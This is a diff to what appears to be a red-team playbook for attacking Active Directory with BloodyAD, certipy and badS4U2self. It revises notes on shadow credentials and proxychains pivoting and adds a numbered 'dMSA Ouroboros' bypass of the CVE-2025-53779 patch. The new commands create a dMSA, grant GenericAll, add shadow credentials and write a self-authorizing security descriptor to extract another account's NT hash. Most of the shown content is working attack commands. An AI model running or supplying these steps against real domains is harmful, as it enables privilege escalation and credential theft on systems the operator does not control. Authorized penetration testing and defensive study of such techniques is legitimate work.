@@ -66,14 +66,14 @@ If you have `GenericWrite` or `GenericAll` on a user or computer.
 # Injects a KeyCredentialLink. BloodyAD will automatically attempt to PKINIT and get the NTLM hash
 bloodyAD -H 10.10.10.10 -d contoso.local -u attacker -p pass add shadowCredentials target_user
 ```
-*(If the automatic unpac fails, BloodyAD saves the certificate. You can then leverage it manually using `gettgtpkinit.py` via PKINITtools).*
+*(If the automatic unpac fails, BloodyAD saves the certificate. Use `certipy auth -pfx <cert>.pfx` to authenticate manually.)*
 
 ### 6. Proxying and Pivoting
 BloodyAD relies extensively on standard network sockets and parses environment variables. It works seamlessly through SOCKS proxies via `proxychains`.
 ```bash
 proxychains bloodyAD -H 10.10.10.10 -d contoso.local -u attacker -p pass get object target_user
 ```
-*(Note for Proxychains: ensure `/etc/proxychains4.conf` or `/etc/proxychains.conf` points to your SOCKS port, e.g. Chisel or Ligolo-ng).*
+*(Note for Proxychains: ensure `/etc/proxychains4.conf` or `/etc/proxychains.conf` points to your SOCKS port, e.g. Chisel or SSH SOCKS).*
 
 ### 7. DNS Record Manipulation
 Used to hijack WPAD, internal resources, or relay targets by poisoning `ADIDNS`.
@@ -126,7 +126,23 @@ badS4U2self "kerberos+ccache://domain\<actor_a>:<actor_a>.ccache@<DC_IP>" \
 # Output: target account's RC4/NT hash (only RC4 yielded via dMSA key package)
 ```
 
-`badS4U2self` is in the `bloodyad` venv (`venvs/bloodyad/bin/`). Clock skew for `badS4U2self` must be corrected with `sudo date -u -s "<DC_time>"` immediately before running (it does not auto-correct like bloodyAD).
+`badS4U2self` is in the `bloodyad` venv (or `kerbad` package in venv-core). Clock skew for `badS4U2self` must be corrected with `sudo date -u -s "<DC_time>"` or `faketime` immediately before running (it does not auto-correct like bloodyAD).
+
+**dMSA Ouroboros (post-patch CVE-2025-53779 bypass):** when the patch validates bidirectional links but not WHO wrote them, an attacker with `CreateChild` + `WriteProperty` on an OU can bypass it by:
+1. Create dMSA via `add badSuccessor` (writes both sides of the superseded link).
+2. `add genericAll` on the dMSA from the attacking principal.
+3. Shadow Credential on the dMSA (`certipy shadow add -account 'dmsa$'`).
+4. Write `msDS-GroupMSAMembership` with a self-authorizing SD (the dMSA's own SID + attacker SID get full rights) — this makes the dMSA authorize its own credential retrieval:
+```bash
+# Get SIDs
+bloodyAD ... get object 'dmsa$' --attr objectSid
+bloodyAD ... get object attacker --attr objectSid
+# Build SD: O:SY D:(A;;0xf01ff;;;<dmsa_sid>)(A;;0xf01ff;;;<attacker_sid>)
+# Write it:
+bloodyAD ... set object 'dmsa$' msDS-GroupMSAMembership --raw --b64 -v '<base64_sd>'
+```
+5. Auth as dMSA (`certipy auth -pfx dmsa.pfx`) → ccache.
+6. `badS4U2self ... --dmsa` → extracts the superseded account's NT hash from the dMSA key package.
 
 ## Anti-Patterns
 - Modifying standard Domain Admin passwords or altering live production `Domain Admins` groups is extremely noisy and often forbidden by red-team Rules of Engagement. Prefer Shadow Credentials or RBCD on computer accounts whenever possible.
